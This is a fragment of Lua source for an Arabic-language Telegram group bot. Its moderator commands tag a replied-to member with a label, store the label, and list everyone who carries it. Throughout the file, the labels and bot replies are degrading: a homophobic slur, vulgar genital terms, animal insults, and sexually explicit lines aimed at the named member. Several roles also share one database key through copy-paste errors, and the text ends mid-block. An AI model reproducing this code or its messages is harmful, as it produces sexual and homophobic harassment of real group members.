if text == ("رفع خول") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Girl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖥔 تم رفع خول في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل خول")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Girl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيل خول من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح البقرات' and Mod(msg) then
database:del(bot_id..'Bakra:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم تنزيل جميع البقرات بالجروب')
end
if text == ("تاك للبقرات") and Mod(msg) then
local list = database:smembers(bot_id..'Bakra:User'..msg.chat_id_)
t = "\n 𖥔 قائمة البقرات الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.." ↚ البقره [@"..username.."]\n"
else
t = t..""..k.." ↚ البقره "..v.."\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد البقره"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع بقره") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Bakra:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖥔 تم رفع بقره في الجروب\n 𖥔 ها يالهايشه تع احلبك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل بقره")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n??  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Bakra:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيل بقره من الجروب\n 𖥔 تعال هاك حليب مالتك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح المزز' and Mod(msg) then
database:del(bot_id..'Tele:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم تنزيل جميع المزز بالجروب')
end
if text == ("تاك للمزز") and Mod(msg) then
local list = database:smembers(bot_id..'Tele:User'..msg.chat_id_)
t = "\n 𖥔 قائمة مزز الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.." ↚ االمزه@"..username.."]\n"
else
t = t..""..k.." ↚ المزه "..v.."\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد مزز"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع مزه") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Tele:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖥔 تم رفع مزه في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل مزه")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Tele:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيل مزه من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الاكساس' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم تنزيل جميع االاكساس')
end
if text == ("تاك للاكساس") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n 𖥔 قائمة كساس الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.." ↚ االكس[@"..username.."]\n"
else
t = t..""..k.." ↚ الكس "..v.."\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد كس"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع كس") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖥔 تم رفع كس في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل كس")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيل كس من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == 'مسح قلبي' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم تنزيل جميع القلوب ')
end
if text == ("تاك لقلبي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n 𖥔 قائمة القلوب في الجروب\n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← قلبي [@"..username.."]\n"
else
t = t..""..k.."← قلبي "..v.."\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد قلوب"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع قلبي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖥔 تم رفع قلبي في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل قلبي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيل قلبي من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح ابني' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم تنزيل جميع أولادي')
end
if text == ("تاك لولادي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n 𖥔 قائمة كساس الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← ابني [@"..username.."]\n"
else
t = t..""..k.."← ابني "..v.."\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد ابني"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع ابني") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖥔 تم رفع ابني في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل ابني")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيل ابني من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح بنتي' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم تنزيل جميع االاكساس')
end
if text == ("تاك لبناتي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n 𖥔 قائمة بناتي الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← بنتي [@"..username.."]\n"
else
t = t..""..k.."← بنتي"..v.."\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد بنات"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع بنتي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖥔 تم رفع بنتي في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل بنتي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيل بنتي من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح خاين' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم تنزيل جميع االاكساس')
end
if text == ("تاك للخاينين") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n 𖥔 قائمة الخاينين الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← خاين [@"..username.."]\n"
else
t = t..""..k.."← خاين"..v.."\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد خاينين"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع خاين") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖥔 تم رفع خاين في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل خاين")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيل خاين من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل الرقصات' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم تنزيل جميع زواحف')
end
if text == ("تاك للرقاصات") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n 𖥔 قائمة رقاصات الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.." ↚ الرقاصه [@"..username.."]\n"
else
t = t..""..k.." ↚ الرقاصه "..v.."\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد رقاصات"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع رقاصه") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔 يرجى الاشتراك بالقناه اولا \n 𖥔 اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
local statuss = '\n 𖥔 تم رفع رقاصه في الجروب\n 𖥔 مبقتش شريفه لا اله الي الله'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل رقاصه")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔 يرجى الاشتراك بالقناه اولا \n 𖥔 اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
status = '\n ?? تم تنزيل رقاصه من الجروب\n 𖥔 بقت شريفه لا اله الي الله'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل المتناكين' and Mod(msg) then
database:del(bot_id..'Jred:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم تنزيل جميع جريزي')
end
if text == ("تاك للمتناكين") and Mod(msg) then
local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
t = "\n 𖥔 قائمة المتناكين الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.." ↚ المتناك [@"..username.."]\n"
else
t = t..""..k.." ↚ المتناك "..v.."\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد متناكين"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع علي زبي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔 يرجى الاشتراك بالقناه اولا \n 𖥔 اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Jred:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
local statuss = '\n 𖥔 تم رفع الـعـضو  علي زبك بنجاح\n 𖥔 تفضل ابدا نيك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل من زبي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔 يرجى الاشتراك بالقناه اولا \n 𖥔 اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Jred:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
status = '\n 𖥔 تم تنزيل الـعـضو  من زبك\n 𖥔 هيفضل متناك بردو'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
